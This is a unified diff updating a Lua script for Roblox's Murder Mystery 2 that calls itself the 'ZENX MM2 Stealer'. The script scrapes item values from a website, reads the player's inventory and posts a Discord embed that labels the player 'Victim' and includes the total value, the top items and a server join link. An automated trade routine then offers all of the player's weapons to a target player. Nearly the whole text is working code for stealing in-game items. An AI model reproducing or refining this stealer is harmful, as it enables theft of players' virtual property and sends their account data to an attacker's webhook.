@@ -18,38 +18,51 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Biscuit-Style Value Scraper + Rarity Categories
+-- Improved Biscuit-Style Value Scraper (Fixed Parsing)
 local valuePages = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    vintage = "https://supremevaluelist.com/mm2/vintages.html",
+    "https://supremevaluelist.com/mm2/godlies.html",
+    "https://supremevaluelist.com/mm2/ancients.html",
+    "https://supremevaluelist.com/mm2/uniques.html",
+    "https://supremevaluelist.com/mm2/vintages.html",
+    "https://supremevaluelist.com/mm2/chromas.html",
 }
 
 local itemValues = {}
+
 local function loadValues()
-    for _, link in pairs(valuePages) do
+    print("🔄 Loading fresh MM2 values...")
+    for _, link in ipairs(valuePages) do
         pcall(function()
             local resp = request({Url = link, Method = "GET"})
             if resp and resp.Body then
-                for name, valStr in resp.Body:gmatch(">([%w%s'%-]+)</[^>]+>%s*Value%s*%-%s*%*?([%d,]+)%*?") do
-                    local clean = name:match("^%s*(.-)%s*$"):lower()
-                    local val = tonumber(valStr:gsub(",", ""))
-                    if clean and val then itemValues[clean] = val end
+                -- Stronger parsing for value numbers
+                for nameBlock, valBlock in resp.Body:gmatch("(<h.-</div>.-Value.-)") do
+                    local name = nameBlock:match(">([^<]+)<")
+                    local valText = valBlock:match("([%d,]+)")
+                    if name and valText then
+                        local cleanName = name:match("^%s*(.-)%s*$"):lower()
+                        local val = tonumber(valText:gsub(",", ""))
+                        if cleanName and val and val > 50 then
+                            itemValues[cleanName] = val
+                        end
+                    end
                 end
             end
         end)
-        task.wait(0.5)
+        task.wait(0.6)
     end
+    print("✅ Loaded " .. #itemValues .. " item values")
 end
+
 loadValues()
 
--- Inventory with Rarity Groups (like the script you sent)
+-- Inventory + Value Calculation
 local itemsToTrade = {}
 local overallValue = 0
-local rarityCounts = {Unique=0, Ancient=0, Godly=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+local rarityCounts = {Godly=0, Ancient=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
 
 local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+
 local success, inventoryData = pcall(function()
     return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 end)
@@ -59,14 +72,14 @@ if success and inventoryData and inventoryData.Weapons then
         local info = itemDatabase[itemId]
         if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
             local name = tostring(info.ItemName)
-            local lowerName = name:lower()
-            local val = itemValues[lowerName] or 150
+            local lower = name:lower()
+            local val = itemValues[lower] or 150
             overallValue += val * count
-            
+
             local rarity = info.Rarity or "Common"
-            if rarityCounts[rarity] then rarityCounts[rarity] += count end
-            
-            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val, rarity = rarity})
+            if rarityCounts[rarity] then rarityCounts[rarity] = rarityCounts[rarity] + count end
+
+            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
         end
     end
 end
@@ -94,11 +107,11 @@ local function postToDiscord()
             fields = {
                 {name = "Victim", value = LocalPlayer.Name, inline = true},
                 {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
-                {name = "Rarity Breakdown", value = string.format("Godly: %d | Ancient: %d | Unique: %d | Vintage: %d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
+                {name = "Rarity Count", value = string.format("Godly:%d Ancient:%d Unique:%d Vintage:%d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
                 {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
-                {name = "Custom Joiner", value = joinLink, inline = false},
+                {name = "Join Link", value = joinLink, inline = false},
             },
-            footer = {text = "ZENX HUB • Biscuit Scraper"},
+            footer = {text = "ZENX HUB • Fixed Value Scraper"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -113,7 +126,7 @@ local function postToDiscord()
     end)
 end
 
--- Trade Engine (improved)
+-- Trade Engine
 local function checkTradeState()
     return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
 end
@@ -135,7 +148,7 @@ local function doTrade(target)
                     local item = table.remove(itemsToTrade, 1)
                     for _ = 1, item.qty do
                         ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
-                        task.wait(0.3)
+                        task.wait(0.32)
                     end
                 end
                 task.wait(4)
@@ -162,4 +175,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer Loaded (Biscuit Scraper + Rarity Groups)")
+print("✅ ZENX MM2 Stealer - Fixed Value Numbers Loaded")
